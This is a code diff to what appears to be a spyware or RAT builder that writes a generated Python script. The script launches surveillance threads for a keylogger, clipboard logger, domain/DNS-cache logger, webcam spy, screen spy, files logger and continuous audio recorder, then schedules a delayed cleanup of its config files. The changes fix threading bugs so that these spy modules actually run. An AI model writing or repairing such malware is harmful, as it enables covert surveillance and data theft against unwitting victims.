@@ -209,7 +209,7 @@ def run_all():
     key_conf_path = write_temp_config("keySpy.conf", keylogger_conf)
     keyConfig(key_conf_path)
     config_paths.append(key_conf_path)
-    threads.append(threading.Thread(target=keyDaemon().run_for_ever()))""")
+    threads.append(threading.Thread(target=keyDaemon().run_for_ever))""")
 
         if include_ClipboardLogger:
             f.write(f"""
@@ -217,7 +217,7 @@ def run_all():
     clip_conf_path = write_temp_config("clipboard.conf", clipboard_conf)
     clipboardConfig(clip_conf_path)
     config_paths.append(clip_conf_path)
-    threads.append(threading.Thread(target=clipDaemon().run_for_ever()))""")
+    threads.append(threading.Thread(target=clipDaemon().run_for_ever))""")
 
         if include_DomainsLogger:
             f.write(f"""
@@ -225,7 +225,10 @@ def run_all():
     domains_conf_path = write_temp_config("domains.conf", domains_conf)
     domainsConfig(domains_conf_path)
     config_paths.append(domains_conf_path)
-    threads.append(threading.Thread(target=domainDaemon().run_for_ever()))""")
+    def get_data():
+        domainDaemon().run_AppData()
+        domainDaemon().run_CacheDns()
+    threads.append(threading.Thread(target=get_data))""")
 
         if include_WebcamSpy:
             f.write(f"""
@@ -233,7 +236,7 @@ def run_all():
     cam_conf_path = write_temp_config("webcam.conf", webcam_conf)
     webcamConfig(cam_conf_path)
     config_paths.append(cam_conf_path)
-    threads.append(threading.Thread(target=camDaemon().run_for_ever()))""")
+    threads.append(threading.Thread(target=camDaemon().run_for_ever))""")
 
         if include_ScreenSpy:
             f.write(f"""
@@ -241,7 +244,7 @@ def run_all():
     screen_conf_path = write_temp_config("screen.conf", screen_conf)
     screenConfig(screen_conf_path)
     config_paths.append(screen_conf_path)
-    threads.append(threading.Thread(target=screenDaemon().run_for_ever()))""")
+    threads.append(threading.Thread(target=screenDaemon().run_for_ever))""")
 
         if include_FilesLogger:
             f.write(f"""
@@ -249,7 +252,7 @@ def run_all():
     files_conf_path = write_temp_config("files.conf", files_conf)
     filesConfig(files_conf_path)
     config_paths.append(files_conf_path)
-    threads.append(threading.Thread(target=filesDaemon().run_for_ever()))""")
+    threads.append(threading.Thread(target=filesDaemon().run_for_ever))""")
 
         if include_AudioRecorder:
             f.write(f"""
@@ -257,7 +260,10 @@ def run_all():
     audio_conf_path = write_temp_config("audio.conf", audio_conf)
     audioConfig(audio_conf_path)
     config_paths.append(audio_conf_path)
-    threads.append(threading.Thread(target=audioDaemon().run_for_ever()))""")
+    def get_audio_forever():
+        while True:
+            audioDaemon().run_for_ever()
+    threads.append(threading.Thread(target=get_audio_forever))""")
 
         f.write("""
     cleanup_thread = threading.Thread(target=delayed_cleanup, args=(config_paths,))
